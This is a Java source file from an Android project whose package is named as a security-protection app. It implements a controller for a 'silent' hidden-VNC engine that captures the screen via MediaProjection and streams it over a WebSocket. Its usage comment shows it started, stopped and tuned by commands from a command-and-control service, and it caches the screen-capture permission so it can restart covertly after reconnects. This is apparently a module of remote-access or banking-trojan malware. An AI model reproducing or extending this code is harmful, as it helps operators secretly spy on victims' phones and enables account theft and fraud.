package com.seguranca.protecao.hvnc;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.util.Log;

import okhttp3.WebSocket;

/**
 * HvncController — thin lifecycle wrapper around HvncEngine.
 *
 * Usage from CommandControlService:
 *
 *   private HvncController hvnc;
 *
 *   // In constructor / service init:
 *   hvnc = new HvncController(ctx, webSocket);
 *
 *   // On START_SILENT_VNC command:
 *   hvnc.start(mediaProjectionResultCode, mediaProjectionData);
 *
 *   // On STOP_SILENT_VNC command:
 *   hvnc.stop();
 *
 *   // On SET_SILENT_VNC_QUALITY command (args.quality):
 *   hvnc.setQuality(args.getInt("quality", 50));
 *
 *   // When WS reconnects, update the socket reference:
 *   hvnc.updateWebSocket(newWebSocket);
 */
public class HvncController {

    private static final String TAG = "HvncController";

    private final Context context;
    private volatile WebSocket webSocket;

    private HvncEngine   engine;
    private MediaProjection projection;

    private int    lastResultCode;
    private Intent lastData;

    public HvncController(Context ctx, WebSocket ws) {
        this.context   = ctx.getApplicationContext();
        this.webSocket = ws;
    }

    // ── Start ─────────────────────────────────────────────────────────────────

    /**
     * Start HVNC with a previously obtained MediaProjection result.
     * @param resultCode  Activity.RESULT_OK from onActivityResult
     * @param data        Intent from onActivityResult
     */
    public synchronized void start(int resultCode, Intent data) {
        if (engine != null) {
            Log.d(TAG, "already running — restart");
            stop();
        }

        lastResultCode = resultCode;
        lastData       = data;

        MediaProjectionManager mpm =
                (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        projection = mpm.getMediaProjection(resultCode, data);
        if (projection == null) {
            Log.e(TAG, "MediaProjection is null — permission not granted?");
            return;
        }

        engine = new HvncEngine(context, projection, webSocket);
        engine.start();
        Log.i(TAG, "HVNC started");
    }

    /** Start with the last-known MediaProjection result (for reconnect scenarios). */
    public synchronized void restart() {
        if (lastData == null) {
            Log.w(TAG, "No cached MediaProjection result — cannot restart");
            return;
        }
        start(lastResultCode, lastData);
    }

    // ── Stop ──────────────────────────────────────────────────────────────────

    public synchronized void stop() {
        if (engine != null) {
            engine.stop();
            engine     = null;
        }
        if (projection != null) {
            projection = null; // engine.stop() already calls projection.stop()
        }
        Log.i(TAG, "HVNC stopped");
    }

    // ── Live updates ──────────────────────────────────────────────────────────

    public void setQuality(int q) {
        HvncEngine e = engine;
        if (e != null) e.setQuality(q);
    }

    /** Update WS reference when connection is re-established. */
    public synchronized void updateWebSocket(WebSocket ws) {
        this.webSocket = ws;
        // Engine holds its own reference — stop and restart with new socket
        if (engine != null) restart();
    }

    public boolean isRunning() { return engine != null; }

    public int getCaptureWidth()  { return engine != null ? engine.getCaptureWidth()  : 360; }
    public int getCaptureHeight() { return engine != null ? engine.getCaptureHeight() : 780; }
}
